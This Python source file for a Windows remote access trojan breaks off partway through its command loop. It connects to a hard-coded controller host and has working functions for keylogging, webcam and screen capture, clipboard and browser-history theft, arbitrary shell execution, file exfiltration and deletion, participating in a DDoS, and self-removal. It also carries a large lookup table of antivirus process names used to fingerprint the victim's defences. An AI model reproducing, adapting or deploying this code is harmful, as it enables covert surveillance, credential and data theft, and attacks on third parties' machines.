import os
import time
import winreg
import socket
import threading
import requests
import win32api,win32con
import win32clipboard
import sys
import ctypes
import pyautogui
import subprocess
import PySimpleGUI
import platform
import webbrowser
import shutil
import cv2
import numpy as np
import string
import easygui
import browserhistory
from prettytable import PrettyTable
import threading
import keyboard
import psutil
ip = "192.168.3.67"
port = 6666


sd = {"360tray.exe": "360安全卫士-实时保护",
"360safe.exe": "360安全卫士-主程序",
"ZhuDongFangYu.exe": "360安全卫士-主动防御",
"360sd.exe": "360杀毒",
"a2guard.exe": "a-squared杀毒",
"ad-watch.exe": "Lavasoft杀毒",
"cleaner8.exe": "The Cleaner杀毒",
"vba32lder.exe": "vb32杀毒",
"MongoosaGUI.exe": "Mongoosa杀毒",
"CorantiControlCenter32.exe": "Coranti2012杀毒",
"F-PROT.exe": "F-Prot AntiVirus",
"CMCTrayIcon.exe": "CMC杀毒",
"K7TSecurity.exe": "K7杀毒",
"UnThreat.exe": "UnThreat杀毒",
"CKSoftShiedAntivirus4.exe": "Shield Antivirus杀毒",
"AVWatchService.exe": "VIRUSfighter杀毒",
"ArcaTasksService.exe": "ArcaVir杀毒",
"iptray.exe": "Immunet杀毒",
"PSafeSysTray.exe": "PSafe杀毒",
"nspupsvc.exe": "nProtect杀毒",
"SpywareTerminatorShield.exe": "SpywareTerminator反间谍软件",
"BKavService.exe": "Bkav杀毒",
"MsMpEng.exe": "Microsoft Security Essentials",
"SBAMSvc.exe": "VIPRE",
"ccSvcHst.exe": "Norton杀毒",
"f-secure.exe": "冰岛",
"avp.exe": "Kaspersky",
"KvMonXP.exe": "江民杀毒",
"RavMonD.exe": "瑞星杀毒",
"Mcshield.exe": "McAfee",
"Tbmon.exe": "McAfee",
"Frameworkservice.exe": "McAfee",
"egui.exe": "ESET NOD32",
"ekrn.exe": "ESET NOD32",
"eguiProxy.exe": "ESET NOD32",
"kxetray.exe": "金山毒霸",
"knsdtray.exe": "可牛杀毒",
"TMBMSRV.exe": "趋势杀毒",
"avcenter.exe": "Avira(小红伞)",
"avguard.exe": "Avira(小红伞)",
"avgnt.exe": "Avira(小红伞)",
"sched.exe": "Avira(小红伞)",
"ashDisp.exe": "Avast网络安全",
"rtvscan.exe": "诺顿杀毒",
"ccapp.exe": "SymantecNorton",
"NPFMntor.exe": "Norton杀毒软件",
"ccSetMgr.exe": "赛门铁克",
"ccRegVfy.exe": "Norton杀毒软件",
"ksafe.exe": "金山卫士",
"QQPCRTP.exe": "QQ电脑管家",
"avgwdsvc.exe": "AVG杀毒",
"QUHLPSVC.exe": "QUICK HEAL杀毒",
"mssecess.exe": "微软杀毒",
"SavProgress.exe": "Sophos杀毒",
"SophosUI.exe": "Sophos杀毒",
"SophosFS.exe": "Sophos杀毒",
"SophosHealth.exe": "Sophos杀毒",
"SophosSafestore64.exe": "Sophos杀毒",
"SophosCleanM.exe": "Sophos杀毒",
"fsavgui.exe": "F-Secure杀毒",
"vsserv.exe": "比特梵德",
"remupd.exe": "熊猫卫士",
"FortiTray.exe": "飞塔",
"safedog.exe": "安全狗",
"parmor.exe": "木马克星",
"Iparmor.exe.exe": "木马克星",
"beikesan.exe": "贝壳云安全",
"KSWebShield.exe": "金山网盾",
"TrojanHunter.exe": "木马猎手",
"GG.exe": "巨盾网游安全盾",
"adam.exe": "绿鹰安全精灵",
"AST.exe": "超级巡警",
"ananwidget.exe": "墨者安全专家",
"AVK.exe": "AntiVirusKit",
"avg.exe": "AVG Anti-Virus",
"spidernt.exe": "Dr.web",
"avgaurd.exe": "Avira Antivir",
"vsmon.exe": "Zone Alarm",
"cpf.exe": "Comodo",
"outpost.exe": "Outpost Firewall",
"rfwmain.exe": "瑞星防火墙",
"kpfwtray.exe": "金山网镖",
"FYFireWall.exe": "风云防火墙",
"MPMon.exe": "微点主动防御",
"pfw.exe": "天网防火墙",
"BaiduSdSvc.exe": "百度杀毒-服务进程",
"BaiduSdTray.exe": "百度杀毒-托盘进程",
"BaiduSd.exe": "百度杀毒-主程序",
"SafeDogGuardCenter.exe": "安全狗",
"safedogupdatecenter.exe": "安全狗",
"safedogguardcenter.exe": "安全狗",
"SafeDogSiteIIS.exe": "安全狗",
"SafeDogTray.exe": "安全狗",
"SafeDogServerUI.exe": "安全狗",
"D_Safe_Manage.exe": "D盾",
"d_manage.exe": "D盾",
"yunsuo_agent_service.exe": "云锁",
"yunsuo_agent_daemon.exe": "云锁",
"HwsPanel.exe": "护卫神",
"hws_ui.exe": "护卫神",
"hws.exe": "护卫神",
"hwsd.exe": "护卫神",
"hipstray.exe": "火绒",
"wsctrl.exe": "火绒",
"usysdiag.exe": "火绒",
"SPHINX.exe": "SPHINX防火墙",
"bddownloader.exe": "百度卫士",
"baiduansvx.exe": "百度卫士-主进程",
"AvastUI.exe": "Avast!5主程序",
"emet_agent.exe": "EMET",
"emet_service.exe": "EMET",
"firesvc.exe": "McAfee",
"firetray.exe": "McAfee",
"hipsvc.exe": "McAfee",
"mfevtps.exe": "McAfee",
"mcafeefire.exe": "McAfee",
"scan32.exe": "McAfee",
"shstat.exe": "McAfee",
"vstskmgr.exe": "McAfee",
"engineserver.exe": "McAfee",
"mfeann.exe": "McAfee",
"mcscript.exe": "McAfee",
"updaterui.exe": "McAfee",
"udaterui.exe": "McAfee",
"naprdmgr.exe": "McAfee",
"cleanup.exe": "McAfee",
"cmdagent.exe": "McAfee",
"frminst.exe": "McAfee",
"mcscript_inuse.exe": "McAfee",
"mctray.exe": "McAfee",
"_avp32.exe": "卡巴斯基",
"_avpcc.exe": "卡巴斯基",
"_avpm.exe": "卡巴斯基",
"aAvgApi.exe": "AVG",
"ackwin32.exe": "已知杀软进程,名称暂未收录",
"alertsvc.exe": "Norton AntiVirus",
"alogserv.exe": "McAfee VirusScan",
"anti-trojan.exe": "Anti-Trojan Elite",
"arr.exe": "Application Request Route",
"atguard.exe": "AntiVir",
"atupdater.exe": "已知杀软进程,名称暂未收录",
"atwatch.exe": "Mustek",
"au.exe": "NSIS",
"aupdate.exe": "Symantec",
"auto-protect.nav80try.exe": "已知杀软进程,名称暂未收录",
"autodown.exe": "AntiVirus AutoUpdater",
"avconsol.exe": "McAfee",
"avgcc32.exe": "AVG",
"avgctrl.exe": "AVG",
"avgemc.exe": "AVG",
"avgrsx.exe": "AVG",
"avgserv.exe": "AVG",
"avgserv9.exe": "AVG",
"avgw.exe": "AVG",
"avkpop.exe": "G DATA SOFTWARE AG",
"avkserv.exe": "G DATA SOFTWARE AG",
"avkservice.exe": "G DATA SOFTWARE AG",
"avkwctl9.exe": "G DATA SOFTWARE AG",
"avltmain.exe": "Panda Software Aplication",
"avnt.exe": "H+BEDV Datentechnik GmbH",
"avp32.exe": "Kaspersky Anti-Virus",
"avpcc.exe": " Kaspersky AntiVirus",
"avpdos32.exe": " Kaspersky AntiVirus",
"avpm.exe": " Kaspersky AntiVirus",
"avptc32.exe": " Kaspersky AntiVirus",
"avpupd.exe": " Kaspersky AntiVirus",
"avsynmgr.exe": "McAfee",
"avwin.exe": " H+BEDV",
"bargains.exe": "Exact Advertising SpyWare",
"beagle.exe": "Avast",
"blackd.exe": "BlackICE",
"blackice.exe": "BlackICE",
"blink.exe": "micromedia",
"blss.exe": "CBlaster",
"bootwarn.exe": "Symantec",
"bpc.exe": "Grokster",
"brasil.exe": "Exact Advertising",
"ccevtmgr.exe": "Norton Internet Security",
"cdp.exe": "CyberLink Corp.",
"cfd.exe": "Motive Communications",
"cfgwiz.exe": " Norton AntiVirus",
"claw95.exe": "已知杀软进程,名称暂未收录",
"claw95cf.exe": "已知杀软进程,名称暂未收录",
"clean.exe": "windows流氓软件清理大师",
"cleaner.exe": "windows流氓软件清理大师",
"cleaner3.exe": "windows流氓软件清理大师",
"cleanpc.exe": "windows流氓软件清理大师",
"cpd.exe": "McAfee",
"ctrl.exe": "已知杀软进程,名称暂未收录",
"cv.exe": "已知杀软进程,名称暂未收录",
"defalert.exe": "Symantec",
"defscangui.exe": "Symantec",
"defwatch.exe": "Norton Antivirus",
"doors.exe": "已知杀软进程,名称暂未收录",
"dpf.exe": "已知杀软进程,名称暂未收录",
"dpps2.exe": "PanicWare",
"dssagent.exe": "Broderbund",
"ecengine.exe": "已知杀软进程,名称暂未收录",
"emsw.exe": "Alset Inc",
"ent.exe": "已知杀软进程,名称暂未收录",
"espwatch.exe": "已知杀软进程,名称暂未收录",
"ethereal.exe": "RationalClearCase",
"exe.avxw.exe": "已知杀软进程,名称暂未收录",
"expert.exe": "已知杀软进程,名称暂未收录",
"f-prot95.exe": "已知杀软进程,名称暂未收录",
"fameh32.exe": "F-Secure",
"fast.exe": " FastUsr",
"fch32.exe": "F-Secure",
"fih32.exe": "F-Secure",
"findviru.exe": "F-Secure",
"firewall.exe": "AshampooSoftware",
"fnrb32.exe": "F-Secure",
"fp-win.exe": " F-Prot Antivirus OnDemand",
"fsaa.exe": "F-Secure",
"fsav.exe": "F-Secure",
"fsav32.exe": "F-Secure",
"fsav530stbyb.exe": "F-Secure",
"fsav530wtbyb.exe": "F-Secure",
"fsav95.exe": "F-Secure",
"fsgk32.exe": "F-Secure",
"fsm32.exe": "F-Secure",
"fsma32.exe": "F-Secure",
"fsmb32.exe": "F-Secure",
"gbmenu.exe": "已知杀软进程,名称暂未收录",
"guard.exe": "ewido",
"guarddog.exe": "ewido",
"htlog.exe": "已知杀软进程,名称暂未收录",
"htpatch.exe": "Silicon Integrated Systems Corporation",
"hwpe.exe": "已知杀软进程,名称暂未收录",
"iamapp.exe": "Symantec",
"iamserv.exe": "Symantec",
"iamstats.exe": "Symantec",
"iedriver.exe": " Urlblaze.com",
"iface.exe": "Panda Antivirus Module",
"infus.exe": "Infus Dialer",
"infwin.exe": "Msviewparasite",
"intdel.exe": "Inet Delivery",
"intren.exe": "已知杀软进程,名称暂未收录",
"jammer.exe": "已知杀软进程,名称暂未收录",
"kavpf.exe": "Kapersky",
"kazza.exe": "Kapersky",
"keenvalue.exe": "EUNIVERSE INC",
"launcher.exe": "Intercort Systems",
"ldpro.exe": "已知杀软进程,名称暂未收录",
"ldscan.exe": "Windows Trojans Inspector",
"localnet.exe": "已知杀软进程,名称暂未收录",
"luall.exe": "Symantec",
"luau.exe": "Symantec",
"lucomserver.exe": "Norton",
"mcagent.exe": "McAfee",
"mcmnhdlr.exe": "McAfee",
"mctool.exe": "McAfee",
"mcupdate.exe": "McAfee",
"mcvsrte.exe": "McAfee",
"mcvsshld.exe": "McAfee",
"mfin32.exe": "MyFreeInternetUpdate",
"mfw2en.exe": "MyFreeInternetUpdate",
"mfweng3.02d30.exe": "MyFreeInternetUpdate",
"mgavrtcl.exe": "McAfee",
"mgavrte.exe": "McAfee",
"mghtml.exe": "McAfee",
"mgui.exe": "BullGuard",
"minilog.exe": "Zone Labs Inc",
"mmod.exe": "EzulaInc",
"mostat.exe": "WurldMediaInc",
"mpfagent.exe": "McAfee",
"mpfservice.exe": "McAfee",
"mpftray.exe": "McAfee",
"mscache.exe": "Integrated Search Technologies Spyware",
"mscman.exe": "OdysseusMarketingInc",
"msmgt.exe": "Total Velocity Spyware",
"msvxd.exe": "W32/Datom-A",
"mwatch.exe": "已知杀软进程,名称暂未收录",
"nav.exe": "Reuters Limited",
"navapsvc.exe": "Norton AntiVirus",
"navapw32.exe": "Norton AntiVirus",
"navw32.exe": "Norton Antivirus",
"ndd32.exe": "诺顿磁盘医生",
"neowatchlog.exe": "已知杀软进程,名称暂未收录",
"netutils.exe": "已知杀软进程,名称暂未收录",
"nisserv.exe": "Norton",
"nisum.exe": "Norton",
"nmain.exe": "Norton",
"nod32.exe": "ESET Smart Security",
"norton_internet_secu_3.0_407.exe": "已知杀软进程,名称暂未收录",
"notstart.exe": "已知杀软进程,名称暂未收录",
"nprotect.exe": "Symantec",
"npscheck.exe": "Norton",
"npssvc.exe": "Norton",
"ntrtscan.exe": "趋势反病毒应用程序",
"nui.exe": "已知杀软进程,名称暂未收录",
"otfix.exe": "已知杀软进程,名称暂未收录",
"outpostinstall.exe": "Outpost",
"patch.exe": "趋势科技",
"pavw.exe": "已知杀软进程,名称暂未收录",
"pcscan.exe": "趋势科技",
"pdsetup.exe": "已知杀软进程,名称暂未收录",
"persfw.exe": "Tiny Personal Firewall",
"pgmonitr.exe": "PromulGate SpyWare",
"pingscan.exe": "已知杀软进程,名称暂未收录",
"platin.exe": "已知杀软进程,名称暂未收录",
"pop3trap.exe": "PC-cillin",
"poproxy.exe": "NortonAntiVirus",
"popscan.exe": "已知杀软进程,名称暂未收录",
"powerscan.exe": "Integrated Search Technologies",
"ppinupdt.exe": "已知杀软进程,名称暂未收录",
"pptbc.exe": "已知杀软进程,名称暂未收录",
"ppvstop.exe": "已知杀软进程,名称暂未收录",
"prizesurfer.exe": "Prizesurfer",
"prmt.exe": "OpiStat",
"prmvr.exe": "Adtomi",
"processmonitor.exe": "Sysinternals",
"proport.exe": "已知杀软进程,名称暂未收录",
"protectx.exe": "ProtectX",
"pspf.exe": "已知杀软进程,名称暂未收录",
"purge.exe": "已知杀软进程,名称暂未收录",
"qconsole.exe": "Norton AntiVirus Quarantine Console",
"qserver.exe": "Norton Internet Security",
"rapapp.exe": "BlackICE",
"rb32.exe": "RapidBlaster",
"rcsync.exe": "PrizeSurfer",
"realmon.exe": "Realmon ",
"rescue.exe": "已知杀软进程,名称暂未收录",
"rescue32.exe": "卡巴斯基互联网安全套装",
"rshell.exe": "已知杀软进程,名称暂未收录",
"rtvscn95.exe": "Real-time virus scanner ",
"rulaunch.exe": "McAfee User Interface",
"run32dll.exe": "PAL PC Spy",
"safeweb.exe": "PSafe Tecnologia",
"sbserv.exe": "Norton Antivirus",
"scrscan.exe": "360杀毒",
"sfc.exe": "System file checker",
"sh.exe": "MKS Toolkit for Win3",
"showbehind.exe": "MicroSmarts Enterprise Component ",
"soap.exe": "System Soap Pro",
"sofi.exe": "已知杀软进程,名称暂未收录",
"sperm.exe": "已知杀软进程,名称暂未收录",
"supporter5.exe": "eScorcher反病毒",
"symproxysvc.exe": "Symantec",
"symtray.exe": "Symantec",
"tbscan.exe": "ThunderBYTE",
"tc.exe": "TimeCalende",
"titanin.exe": "TitanHide",
"tvmd.exe": "Total Velocity",
"tvtmd.exe": " Total Velocity",
"vettray.exe": "eTrust",
"vir-help.exe": "已知杀软进程,名称暂未收录",
"vnpc3000.exe": "已知杀软进程,名称暂未收录",
"vpc32.exe": "Symantec",
"vpc42.exe": "Symantec",
"vshwin32.exe": "McAfee",
"vsmain.exe": "McAfee",
"vsstat.exe": "McAfee",
"wfindv32.exe": "已知杀软进程,名称暂未收录",
"zapro.exe": "Zone Alarm",
"zonealarm.exe": "Zone Alarm",
"AVPM.exe": "Kaspersky",
"A2CMD.exe": "Emsisoft Anti-Malware",
"A2SERVICE.exe": "a-squared free",
"A2FREE.exe": "a-squared Free",
"ADVCHK.exe": "Norton AntiVirus",
"AGB.exe": "安天防线",
"AHPROCMONSERVER.exe": "安天防线",
"AIRDEFENSE.exe": "AirDefense",
"ALERTSVC.exe": "Norton AntiVirus",
"AVIRA.exe": "小红伞杀毒",
"AMON.exe": "Tiny Personal Firewall",
"AVZ.exe": "AVZ",
"ANTIVIR.exe": "已知杀软进程,名称暂未收录",
"APVXDWIN.exe": "熊猫卫士",
"ASHMAISV.exe": "Alwil",
"ASHSERV.exe": "Avast Anti-virus",
"ASHSIMPL.exe": "AVAST!VirusCleaner",
"ASHWEBSV.exe": "Avast",
"ASWUPDSV.exe": "Avast",
"ASWSCAN.exe": "Avast",
"AVCIMAN.exe": "熊猫卫士",
"AVCONSOL.exe": "McAfee",
"AVENGINE.exe": "熊猫卫士",
"AVESVC.exe": "Avira AntiVir Security Service",
"AVEVL32.exe": "已知杀软进程,名称暂未收录",
"AVGAM.exe": "AVG",
"AVGCC.exe": "AVG",
"AVGCHSVX.exe": "AVG",
"AVGCSRVX": "AVG",
"AVGNSX.exe": "AVG",
"AVGCC32.exe": "AVG",
"AVGCTRL.exe": "AVG",
"AVGEMC.exe": "AVG",
"AVGFWSRV.exe": "AVG",
"AVGNTMGR.exe": "AVG",
"AVGSERV.exe": "AVG",
"AVGTRAY.exe": "AVG",
"AVGUPSVC.exe": "AVG",
"AVINITNT.exe": "Command AntiVirus for NT Server",
"AVPCC.exe": "Kaspersky",
"AVSERVER.exe": "Kerio MailServer",
"AVSCHED32.exe": "H+BEDV",
"AVSYNMGR.exe": "McAfee",
"AVWUPSRV.exe": "H+BEDV",
"BDSWITCH.exe": "BitDefender Module",
"BLACKD.exe": "BlackICE",
"CCEVTMGR.exe": "Symantec",
"CFP.exe": "COMODO",
"CLAMWIN.exe": "ClamWin Portable",
"CUREIT.exe": "DrWeb CureIT",
"DEFWATCH.exe": "Norton Antivirus",
"DRWADINS.exe": "Dr.Web",
"DRWEB.exe": "Dr.Web",
"DEFENDERDAEMON.exe": "ShadowDefender",
"EWIDOCTRL.exe": "Ewido Security Suite",
"EZANTIVIRUSREGISTRATIONCHECK.exe": "e-Trust Antivirus",
"FIREWALL.exe": "AshampooSoftware",
"FPROTTRAY.exe": "F-PROT Antivirus",
"FPWIN.exe": "Verizon",
"FRESHCLAM.exe": "ClamAV",
"FSAV32.exe": "F-Secure",
"FSBWSYS.exe": "F-secure",
"FSDFWD.exe": "F-Secure",
"FSGK32.exe": "F-Secure",
"FSGK32ST.exe": "F-Secure",
"FSMA32.exe": "F-Secure",
"FSMB32.exe": "F-Secure",
"FSSM32.exe": "F-Secure",
"GUARDGUI.exe": "网游保镖",
"GUARDNT.exe": "IKARUS",
"IAMAPP.exe": "Symantec",
"INOCIT.exe": "eTrust",
"INORPC.exe": "eTrust",
"INORT.exe": "eTrust",
"INOTASK.exe": "eTrust",
"INOUPTNG.exe": "eTrust",
"ISAFE.exe": "eTrust",
"KAV.exe": "Kaspersky",
"KAVMM.exe": "Kaspersky",
"KAVPF.exe": "Kaspersky",
"KAVPFW.exe": "Kaspersky",
"KAVSTART.exe": "Kaspersky",
"KAVSVC.exe": "Kaspersky",
"KAVSVCUI.exe": "Kaspersky",
"KMAILMON.exe": "金山毒霸",
"MCAGENT.exe": "McAfee",
"MCMNHDLR.exe": "McAfee",
"MCREGWIZ.exe": "McAfee",
"MCUPDATE.exe": "McAfee",
"MCVSSHLD.exe": "McAfee",
"MINILOG.exe": "Zone Alarm",
"MYAGTSVC.exe": "McAfee",
"MYAGTTRY.exe": "McAfee",
"NAVAPSVC.exe": "Norton",
"NAVAPW32.exe": "Norton",
"NAVLU32.exe": "Norton",
"NAVW32.exe": "Norton Antivirus",
"NEOWATCHLOG.exe": "NeoWatch",
"NEOWATCHTRAY.exe": "NeoWatch",
"NISSERV.exe": "Norton",
"NISUM.exe": "Norton",
"NMAIN.exe": "Norton",
"NOD32.exe": "ESET NOD32",
"NPFMSG.exe": "Norman个人防火墙",
"NPROTECT.exe": "Symantec",
"NSMDTR.exe": "Norton",
"NTRTSCAN.exe": "趋势科技",
"OFCPFWSVC.exe": "OfficeScanNT",
"ONLINENT.exe": "已知杀软进程,名称暂未收录",
"OP_MON.exe": " OutpostFirewall",
"PAVFIRES.exe": "熊猫卫士",
"PAVFNSVR.exe": "熊猫卫士",
"PAVKRE.exe": "熊猫卫士",
"PAVPROT.exe": "熊猫卫士",
"PAVPROXY.exe": "熊猫卫士",
"PAVPRSRV.exe": "熊猫卫士",
"PAVSRV51.exe": "熊猫卫士",
"PAVSS.exe": "熊猫卫士",
"PCCGUIDE.exe": "PC-cillin",
"PCCIOMON.exe": "PC-cillin",
"PCCNTMON.exe": "PC-cillin",
"PCCPFW.exe": "趋势科技",
"PCCTLCOM.exe": "趋势科技",
"PCTAV.exe": "PC Tools AntiVirus",
"PERSFW.exe": "Tiny Personal Firewall",
"PERVAC.exe": "已知杀软进程,名称暂未收录",
"PESTPATROL.exe": "Ikarus",
"PREVSRV.exe": "熊猫卫士",
"RTVSCN95.exe": "Real-time Virus Scanner",
"SAVADMINSERVICE.exe": "SAV",
"SAVMAIN.exe": "SAV",
"SAVSCAN.exe": "SAV",
"SDHELP.exe": "Spyware Doctor",
"SHSTAT.exe": "McAfee",
"SPBBCSVC.exe": "Symantec",
"SPIDERCPL.exe": "Dr.Web",
"SPIDERML.exe": "Dr.Web",
"SPIDERUI.exe": "Dr.Web",
"SPYBOTSD.exe": "Spybot ",
"SWAGENT.exe": "SonicWALL",
"SWDOCTOR.exe": "SonicWALL",
"SWNETSUP.exe": "Sophos",
"SYMLCSVC.exe": "Symantec",
"SYMPROXYSVC.exe": "Symantec",
"SYMSPORT.exe": "Sysmantec",
"SYMWSC.exe": "Sysmantec",
"SYNMGR.exe": "Sysmantec",
"TMLISTEN.exe": "趋势科技",
"TMNTSRV.exe": "趋势科技",
"TMPROXY.exe": "趋势科技",
"TNBUTIL.exe": "Anti-Virus",
"VBA32ECM.exe": "已知杀软进程,名称暂未收录",
"VBA32IFS.exe": "已知杀软进程,名称暂未收录",
"VBA32PP3.exe": "已知杀软进程,名称暂未收录",
"VCRMON.exe": "VirusChaser",
"VRMONNT.exe": "HAURI",
"VRMONSVC.exe": "HAURI",
"VSHWIN32.exe": "McAfee",
"VSSTAT.exe": "McAfee",
"XCOMMSVR.exe": "BitDefender",
"ZONEALARM.exe": "Zone Alarm",
"360rp.exe": "360杀毒",
"afwServ.exe": " Avast Antivirus",
"safeboxTray.exe": "360杀毒",
"360safebox.exe": "360杀毒",
"QQPCTray.exe": "QQ电脑管家",
"KSafeTray.exe": "金山毒霸",
"KSafeSvc.exe": "金山毒霸",
"KWatch.exe": "金山毒霸",
"gov_defence_service.exe": "云锁",
"gov_defence_daemon.exe": "云锁",
"smartscreen.exe": "Windows Defender",
"finalshell.exe": "finalshell终端管理",
"navicat.exe": "数据库管理",
"AliSecGuard.exe": "阿里云盾",
"AliYunDunUpdate.exe": "阿里云盾",
"AliYunDun.exe": "阿里云盾",
"CmsGoAgent.windows-amd64.": "阿里云监控"}

def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

def ison(jincheng):
    a = os.popen('tasklist | findstr "' + jincheng+'"').readlines()
    if a == []:
        return False
    else:
        return True

def getnwip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    a = s.getsockname()[0]
    s.close()
    return a
def get_text():
    win32clipboard.OpenClipboard()
    text = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    return text
def getip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    a = s.getsockname()[0]
    s.close()
    return a


gtip = getip()

def jpjl():
    def on_press(event):
        requests.get('http://'+ip+':5000/kb',params={'kb':gtip+':'+str(event)})
    keyboard.on_press(on_press)
    keyboard.wait()

def closeExe():
    while True:
        try:
            close = eval(requests.get('http://'+ip+':5000/close').text)
            for i in close:
                if ison(i):
                    os.popen('taskkill /f /im "'+i+'"')
        except:
            continue

def ddos():
    while True:
        url = 'http://'+ip+':5000/ddos'
        wz = requests.get(url).text
        if wz.replace(' ','') == '':
            print('yes')
            time.sleep(10)
            continue
        else:
            #print('yes')
            for i in range(5000):
                try:
                    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'}
                    requests.get(wz, headers=headers)
                except Exception as a:
                    print('error',str(a))

def zhu():
    '''def getip():
        try:
            return requests.get(url="http://ip.42.pl/raw").text
        except:
            return "can't get the ip"'''
    ip_port = (ip,port)

    sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sk.connect(ip_port)

    def send(nr):
        nr = gtip+':'+nr
        sk.send(nr.encode(encoding='utf-8'))
    def sendfile(lj):
        url = 'http://'+ip+':5000/sc'
        files = {'file': (gtip,open(lj, "rb").read())}
        requests.post(url, files=files)
    def getpanfu():
        disk_list = []
        for c in string.ascii_uppercase:
            disk = c + ':'
            if os.path.isdir(disk):
                disk_list.append(disk)
        return disk_list

    send(' is in!!!')
    while True:
        date = sk.recv(8192)  # 接受信息
        nr = date.decode('utf-8')
        if nr[:5] == 'king:':
            nr = nr[5:]
            if nr[:3] == 'ip:':
                if nr[3:].split(':')[0] != gtip:
                    continue
                else:
                    nr = ':'.join(nr[3:].split(':')[1:])
            if nr[:4] == 'cmd:':
                nr = nr[4:]
                send('\n'+os.popen(nr).read())
            elif nr == 'restart':
                send('ok')
                os.system('shutdown -r -t 1')
            elif nr == 'shutdown':
                send('ok')
                os.system('shutdown -s -t 1')
            elif nr[:5] == 'send:':
                send('ok')
                nr = nr[5:]
                win32api.MessageBox(0, nr, '', win32con.MB_OK)
                send('The pop-up window has been closed \nmsg:'+nr)
            elif nr[:6] == 'input:':
                send('ok')
                nr = nr[6:]
                send(easygui.enterbox(nr))
            elif nr == 'remove this':
                try:
                    pid = str(os.getpid())
                    open('remove.bat', 'w', encoding='ANSI').write(
                        'taskkill /f /t /im "'+pid+'"\ndel ".\\'+sys.argv[0].split('\\')[::-1][0]+'"\ndel .\\remove.bat\ncls')
                    os.system('start .\\remove.bat')
                except:
                    send('error')
            elif nr == 'config':
                try:
                    system_content = '\n\nsystem name:   ' + platform.system() + '\n' + 'system name and system version:   ' + platform.platform() + '\n' + 'system version:   ' + platform.version() + '\n' + 'system bit:   ' + str(platform.architecture()) + '\n' + 'computer type:   ' + platform.machine() + '\n' + 'The network name of the computer:   ' + platform.node() + '\n' + 'Computer processor information:   ' + platform.processor() + '\n' + 'ip:   ' + getnwip()
                    send(system_content)
                except:
                    send('error')
            elif nr == 'is admin':
                try:
                    send(str(isAdmin()))
                except:
                    send('error')
            elif nr == 'get browser':
                try:
                    dc = browserhistory.get_browserhistory()
                    jl = []
                    for i in dc:
                        jl.append(i)
                    send(str(jl))
                except:
                    send('error')
            elif nr.startswith('browser history:'):
                try:
                    nr = nr[16:]
                    dc = browserhistory.get_browserhistory()
                    a = dc[nr]
                    jl = ''
                    num = 0
                    for j in a:
                        table = PrettyTable()
                        table.add_column(j[1], [j[2], j[0]])
                        jl += str(table)+'\n'
                        num += 1
                    send(jl[:-1])
                except Exception as a:
                    send("error:"+str(a))
            elif nr == 'get clipboard':
                try:
                    send(get_text())
                except:
                    send('error')
            elif nr == 'get antivirus':
                try:
                    pids = psutil.pids()
                    jl = []
                    for pid in pids:
                        p = psutil.Process(pid)
                        process_name = p.name()
                        if process_name in sd:
                            jl.append(sd[process_name])
                    send(str(jl))
                except:
                    send('error')
            elif nr[:4] == 'say:':
                try:
                    nr = nr[4:]
                    open('read.vbs', 'w', encoding='ANSI').write('CreateObject("SAPI.SpVoice").Speak "' + nr + '"')
                    os.system('read.vbs')
                    os.remove('read.vbs')
                except:
                    send("error can't say")
            elif nr == 'screenshot':
                try:
                    img = pyautogui.screenshot()  # 分别代表：左上角坐标，宽高
                    # 对获取的图片转换成二维矩阵形式，后再将RGB转成BGR
                    # 因为imshow,默认通道顺序是BGR，而pyautogui默认是RGB所以要转换一下，不然会有点问题
                    img = cv2.cvtColor(np.asarray(img), cv2.COLOR_RGB2BGR)
                    # cv2.imshow("img.jpg", img)
                    cv2.imwrite('img.jpg', img)
                    #cv2.waitKey(0)
                    sendfile('./img.jpg')
                    os.remove('img.jpg')
                    send('ok')
                except:
                    send('error')
            elif nr == 'photo':
                try:
                    cap = cv2.VideoCapture(0)  # 开启摄像头
                    f, frame = cap.read()  # 将摄像头中的一帧图片数据保存
                    cv2.imwrite('youimg.jpg', frame)  # 将图片保存为本地文件
                    cap.release()  # 关闭摄像头
                    sendfile('./youimg.jpg')
                    os.remove('youimg.jpg')
                    send('ok')
                except:
                    send('error')
            elif nr[:5] == 'file:':
                try:
                    nr = nr[5:]
                    wenjianjiayuwenjianjia = []
                    for root, dirs, files in os.walk(nr):
                        wenjianjiayuwenjianjia.append(dirs)
                        break
                    for root, dirs, files in os.walk(nr):
                        wenjianjiayuwenjianjia.append(files)
                        break
                    wj = '\n\n'
                    for i in wenjianjiayuwenjianjia[0]:
                        wj+='folder:'+i+'\n'
                    wj += '\n'
                    for i in wenjianjiayuwenjianjia[1]:
                        wj+='file:'+i+'\n'
                    wj+='\n\n\nIn folder:'+nr+'\n\n'
                    send(wj)
                except:
                    send('file error')
            elif nr[:7] == 'remove:':
                try:
                    nr = nr[7:]
                    if os.path.isfile(nr):
                        os.remove(nr)
                        send('ok')
                    elif os.path.isdir(nr):
                        shutil.rmtree(nr)
                        send('ok')
                except:
                    send('remove error')
            elif nr[:5] == 'copy:':
                try:
                    nr = nr[5:].split(' | ')
                    if os.path.isfile(nr[0]):
                        shutil.copy(nr[0],nr[1])
                    elif os.path.isdir(nr[0]):
                        shutil.copytree(nr[0],nr[1])
                except Exception as a:
                    send('copy error:'+str(a))
            elif nr[:5] == 'give:':
                try:
                    nr = nr[5:]
                    url = 'http://' + ip + ':5000/xz'
                    ctt = requests.get(url).content
                    open(nr,'wb').write(ctt)
                    send('ok')
                except:
                    send('give error')
            elif nr[:9] == 'get file:':
                try:
                    nr = nr[9:]
                    url = 'http://' + ip + ':5000/scfile'
                    files = {'file': (str([gtip,nr.replace('\\','/').split('/')[::-1][0]]),open(nr, "rb"))}
                    requests.post(url, files=files)
                    send('ok')
                except:
                    send('get error')
            elif nr[:7] == 'rename:':
                try:
                    nr = nr[7:].split(' | ')
                    os.rename(nr[0],nr[1])
                    send('ok')
                except:
                    send('rename error')
            elif nr[:9] == 'make dir:':
                try:
                    nr = nr[9:]
                    os.mkdir(nr)
                    send('ok')
                except:
                    send('make dir error')
            elif nr[:10] == 'make file:':
                try:
                    nr = nr[10:].split(' | ')
                    open(nr[0],'w',encoding='utf-8').write(nr[1])
